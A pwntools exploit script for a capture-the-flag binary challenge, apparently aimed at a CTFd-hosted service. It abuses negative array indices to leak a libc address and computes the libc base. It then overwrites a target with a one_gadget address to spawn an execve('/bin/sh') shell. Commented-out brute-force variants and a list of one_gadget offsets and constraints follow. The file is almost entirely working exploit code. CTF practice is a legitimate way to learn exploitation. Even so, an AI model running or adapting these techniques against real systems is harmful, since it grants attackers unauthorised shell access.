#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *
import os
import sys


exe = context.binary = ELF('./chall')
context.terminal = ['tilix', '--maximize' , '-e', 'sh', '-c']
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30250)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
continue
'''.format(**locals())

# -- Exploit goes here --
libc = ELF('./libc.so.6?token=eyJ1c2VyX2lkIjoxMDAyLCJ0ZWFtX2lkIjo2MTIsImZpbGVfaWQiOjM4fQ.X6J1Nw.KTv2gpwL4Vdz1EZmXTXm0ZDbasg')
io = start()
    
io.recvline()

io.sendline("-4") # -4 ==> libc leak ; -2 ==> pie leak
leak = int("0x" + (io.recvline().strip("\n")), 16)
log.info( "Libc Leak : %s " % (hex(leak)))
libc.address = leak - 0x7bec0
log.info( "Libc Base : %s " % (hex(libc.address)))

io.recvline()

io.sendline("-75")
io.recvline()
#io.sendline(str(libc.address + 0x10a398).ljust(8, '\x00'))
io.sendline(str(int(libc.address + 0x4f322)))
io.interactive()

#0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#0x4f322 execve("/bin/sh", rsp+0x40, environ)
#0xe569f execve("/bin/sh", r14, r12)
#0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
#0xe585f execve("/bin/sh", r10, [rbp-0x70])
#0xe5863 execve("/bin/sh", r10, rdx)
#0x10a38c execve("/bin/sh", rsp+0x70, environ)
#0x10a398 execve("/bin/sh", rsi, [rax])

'''
for i in range(100):

    io = start()
    
    io.recvline()
    
    io.sendline("-4") # -4 ==> libc leak ; -2 ==> pie leak
    leak = int("0x" + (io.recvline().strip("\n")), 16)
    log.info( "Libc Leak : %s " % (hex(leak)))
    exe.address = leak - 0x33c8
    log.info( "Libc base : %s " % (hex(exe.address)))
    
    _fini = exe.address + 0x12c8
    log.info("FINI : %s " % hex(_fini))
    
    io.recvline()
    junk = 0x414141 >> 3
    
    io.sendline("-{}".format(i))
    
    io.recvline()
    io.sendline(str(0xdeadbeef))
    print(i)
    io.interactive()

'''
'''
uwu = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a38c, 0x10a398]

    
libc = ELF('./libc.so.6')
io = start()

io.recvline()

io.sendline("-4") # -4 ==> libc leak ; -2 ==> pie leak
leak = int("0x" + (io.recvline().strip("\n")), 16)
log.info( "Libc Leak : %s " % (hex(leak)))
libc.address = leak - 0x7bec0
log.info( "Libc Base : %s " % (hex(libc.address)))
print(sys.argv[1])
one_shot = libc.address + int(sys.argv[1])
io.recvline()
junk = 0x414141 >> 3
i=10
io.sendline("-{}".format(i))
log.info(hex(one_shot))
io.recvline()
io.send(str(hex(one_shot)))
print(i)
io.interactive()
'''

"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
